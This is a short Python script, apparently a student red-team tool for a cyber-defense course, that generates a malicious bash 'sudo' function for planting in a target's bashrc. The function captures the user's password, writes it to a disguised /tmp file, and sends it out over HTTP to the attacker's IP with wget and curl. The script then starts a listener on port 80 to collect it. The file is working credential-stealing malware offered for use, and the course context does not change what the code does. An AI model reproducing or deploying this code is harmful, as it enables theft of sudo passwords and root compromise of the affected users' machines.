# pwgrabber.py
# Jared Sullivan
# CSEC-473 Cyber Defense Techniques
# Red Team Tool

# The purpose of this tool is to create a bash function to be copied to the target's machine
# This function is to be copied to the /etc/bash-bashrc file if you have root access
# or to the users ~/.bashrc file
# This function changes the way sudo works. It takes input the same way sudo does,
# and it then sends an http request to http://{attacker_ip}/{$USER}:{PW}
# This function also saves the password to an inconspicuous looking file in /tmp
# This tool also gets the attacker's IP address and starts an HTTP server
# which will be the listener for the target's password
# This tool adds further automation to TokyoNeon and Null Byte's function of a similar nature

import os
print("This is the sudo password grabber")
print("This tool requires user-level access for the account you are trying to steal from")

ip = os.popen("hostname -I").read()
ip = str(ip).rstrip()

if os.path.exists("PWG5fQ.sh"):
    os.remove("PWG5fQ.sh")

f = open("PWG5fQ.sh", "x")
f.write('function sudo()\n{\nrealsudo="$(which sudo)";\n')
f.write('read -s -p "[sudo] password for $USER: " pw;\n')
f.write('printf "\\n";\n')

f.write('touch /tmp/config-err-PWG5fQ;\n')
f.write('printf "%s\\n" "$USER : $pw" > /tmp/config-err-PWG5fQ;\n')

f.write('wget "')
f.write(ip)
f.write('/$USER:$pw" > /dev/null 2>&1;\n')

f.write('curl -s "')
f.write(ip)
f.write('/$USER:$pw" > /dev/null 2>&1;\n')

f.write('$realsudo -S -u root bash -c "exit" <<< "$pw" > /dev/null 2>&1;\n')
f.write('$realsudo "${@:1}";\n')
f.write('}')
f.close()

print("Copy the contents of file: PWG5fQ.sh")
print("If you currently have root access, paste the contents into the /etc/bash.bashrc file")
print("If you only have user-level access, paste the contents into the ~/.bashrc file\n")

print("File will be saved on target machine to /tmp/config-err-PWG5fQ")
print("Password will be seen as a 404 error on the http server in the form \"GET /{USER}:{PASS} HTTP/1.1\" 404\n")
print("Now starting http server on this machine...\n\n")
os.system('sudo python3 -m http.server 80')
